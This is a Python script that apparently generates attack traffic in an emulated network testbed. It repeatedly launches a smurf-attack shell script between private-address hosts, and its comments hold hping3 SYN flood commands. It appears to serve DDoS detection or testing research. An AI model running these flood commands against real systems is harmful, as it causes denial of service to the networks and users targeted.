
import multiprocessing
import os 
import threading
import time
import sys
import random
import subprocess
import traceback
import tempfile
from more_itertools import distinct_permutations
import multiprocessing
import signal

from concurrent.futures import ThreadPoolExecutor


class Attack_flow():
    host_id=""
    dst_ip=""
    src_ip=""
    pid=0
    proc=None


    def __init__(self,host_id,src_ip,dst_ip):
        # threading.Thread.__init__(self)
        self.dst_ip=dst_ip
        self.host_id=host_id
        self.src_ip=src_ip

    # def run(self):
    #     os.system("./host-cmd "+self.host_id+" hping3 -S -p ++ -i u10000 -d 2000 -V  "+self.dst_ip)


    # def run(self):
    #     os.system("./host-cmd "+self.host_id+" hping3 -S -p ++ -i u32000 -d 346 -V  "+self.dst_ip)  
    def run(self):
        cmd="./host-cmd "+self.host_id+" ./smurf_attack.sh  "+self.src_ip+" "+self.dst_ip 
        proc=subprocess.Popen(cmd,shell=True)








def main():

    thread_pool = ThreadPoolExecutor(max_workers=20)

    n=1
    attack_flow_arr=[]
    id_arr=[]

    host_id_arr=["h01","h01","h12","h12","h11","h22","h22"]

    src_ip_arr=["10.0.9.1","10.0.9.1","10.0.1.11","10.0.1.11","10.0.1.12","10.0.2.21","10.0.2.21"]
    dst_ip_arr=["10.0.3.32","10.0.3.31","10.0.3.31","10.0.4.41","10.0.4.42","10.0.4.42","10.0.4.41"]

    for i in range(len(host_id_arr)):
        attack_flow=Attack_flow(host_id_arr[i],src_ip_arr[i],dst_ip_arr[i])
        attack_flow_arr.append(attack_flow)
    


    print("where")


    while(True):
        id_arr=range(7)
        random.shuffle(id_arr)
        id_arr=id_arr[0:n]
        
        for id in id_arr:
            t = threading.Thread(target=attack_flow_arr[id].run,name="job1")
            t.start()
        
        time.sleep(10)









if __name__ == "__main__":
    main()


